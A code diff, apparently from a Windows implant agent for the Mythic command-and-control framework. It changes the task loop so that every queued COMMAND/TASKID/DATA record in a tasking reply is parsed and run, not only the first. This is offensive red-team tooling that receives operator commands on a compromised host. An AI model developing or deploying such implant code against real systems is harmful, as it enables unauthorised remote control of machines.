@@ -1451,22 +1451,53 @@ VOID agent_main(PINSTANCE inst) {
         }
 
         if (tasks && tasks_len > 0) {
-            const BYTE* cmd_name = NULL; DWORD cmd_name_len = 0;
-            const BYTE* task_id  = NULL; DWORD task_id_len  = 0;
-            const BYTE* task_data = NULL; DWORD task_data_len = 0;
+            // Iterate ALL task TLV triples (COMMAND/TASKID/DATA) in the
+            // get_tasking reply - Mythic delivers the whole queued batch in one
+            // response and every task must be executed or it stays "agent
+            // processing" server-side forever.
+            DWORD tpos = 0;
+            while (tpos + 5 <= tasks_len) {
+                BYTE t = tasks[tpos];
+                DWORD len = ((DWORD)tasks[tpos+1] << 24) | ((DWORD)tasks[tpos+2] << 16) |
+                            ((DWORD)tasks[tpos+3] << 8)  | tasks[tpos+4];
+                tpos += 5;
+                if (tpos + len > tasks_len) break;
+                if (t != TLV_COMMAND) { tpos += len; continue; }
 
-            if (tlv_find(tasks, tasks_len, TLV_COMMAND, &cmd_name, &cmd_name_len) &&
-                tlv_find(tasks, tasks_len, TLV_TASKID, &task_id, &task_id_len)) {
+                // task boundary found: parse this triple
+                const BYTE* cmd_name = tasks + tpos; DWORD cmd_name_len = len;
+                tpos += len;
 
-                tlv_find(tasks, tasks_len, TLV_DATA, &task_data, &task_data_len);
+                const BYTE* task_id = NULL; DWORD task_id_len = 0;
+                const BYTE* task_data = NULL; DWORD task_data_len = 0;
+                // find the TASKID (next TLV) then optional DATA before the next COMMAND
+                DWORD scan = tpos;
+                while (scan + 5 <= tasks_len) {
+                    BYTE st = tasks[scan];
+                    DWORD slen = ((DWORD)tasks[scan+1] << 24) | ((DWORD)tasks[scan+2] << 16) |
+                                 ((DWORD)tasks[scan+3] << 8)  | tasks[scan+4];
+                    scan += 5;
+                    if (scan + slen > tasks_len) break;
+                    if (st == TLV_TASKID) {
+                        task_id = tasks + scan; task_id_len = slen;
+                    } else if (st == TLV_DATA && task_id) {
+                        task_data = tasks + scan; task_data_len = slen;
+                    } else if (st == TLV_COMMAND) {
+                        scan -= 5;  // rewind: the header belongs to the NEXT task
+                        break;
+                    }
+                    scan += slen;
+                }
 
                 char cmd_buf[64] = {0};
                 if (cmd_name_len < sizeof(cmd_buf))
                     es_memcpy(cmd_buf, (PVOID)cmd_name, cmd_name_len);
 
                 char tid_buf[40] = {0};
-                if (task_id_len < sizeof(tid_buf))
+                if (task_id && task_id_len < sizeof(tid_buf))
                     es_memcpy(tid_buf, (PVOID)task_id, task_id_len);
+                else
+                    tid_buf[0] = 0;
 
                 BYTE* out_data = NULL;
                 DWORD out_len = 0;
